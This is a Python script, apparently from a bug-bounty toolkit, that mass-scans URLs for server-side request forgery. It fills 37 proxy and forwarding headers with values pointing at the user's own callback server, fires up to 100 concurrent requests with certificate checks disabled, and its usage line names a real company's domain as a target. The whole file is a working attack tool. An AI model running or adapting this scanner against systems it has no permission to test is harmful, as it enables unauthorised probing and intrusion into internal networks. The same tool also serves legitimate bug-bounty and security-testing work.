#https://github.com/m4ll0k/Bug-Bounty-Toolz/blob/master/ssrf.py

import aiohttp
import asyncio
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

injectable_headers = [
    "Proxy-Host","Request-Uri","X-Forwarded","X-Forwarded-By","X-Forwarded-For",
    "X-Forwarded-For-Original","X-Forwarded-Host","X-Forwarded-Server","X-Forwarder-For",
    "X-Forward-For","Base-Url","Http-Url","Proxy-Url","Redirect","Real-Ip","Referer","Referrer",
    "Uri","Url","X-Host","X-Http-Destinationurl","X-Http-Host-Override","X-Original-Remote-Addr",
    "X-Original-Url","X-Proxy-Url","X-Rewrite-Url","X-Real-Ip","X-Remote-Addr","True-Client-IP",
    "CF-Connecting_IP","X-Wap-Profile","Contact","Forwarded","From","Client-IP","X-Originating-IP","X-Client-IP"
    ]


def usage():
    print('Usage:\n\tpython3 {tool} <targets.txt> <your_server>\n\tgau uber.com | python3 {tool} <your_server>'.format(tool=sys.argv[0]))
    sys.exit(0)

async def fetch(session, url, sema):
    headers = {
        'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15' 
    }
    for header in injectable_headers:
        if 'http' not in url:
            url = 'http://' + url
        headers[header] = url.split('/')[2] + '.' + header + '.' + sys.argv[2]

    #proxies = 'http://127.0.0.1:8080'

    try:
        async with sema, session.get(url, headers= headers, ssl = False, allow_redirects = False) as response:
            print('[ + ] Code: {code} - {url}'.format(code=response.status,url=response.url))
    except:
        pass

async def main(urls):
   
    tasks = []
    sema = asyncio.BoundedSemaphore(value=100)
    async with aiohttp.ClientSession() as session:
        for url in urls:
            tasks.append(fetch(session, url, sema))
        await asyncio.gather(*tasks)


if __name__ == '__main__':
    import pathlib
    here = pathlib.Path(__file__).parent

    if len(sys.argv) == 3:
        with open(here.joinpath(sys.argv[1])) as infile:
            urls = set(map(str.strip, infile))
        
        loop = asyncio.get_event_loop()
        loop.run_until_complete(main(urls))
    else:
        usage()
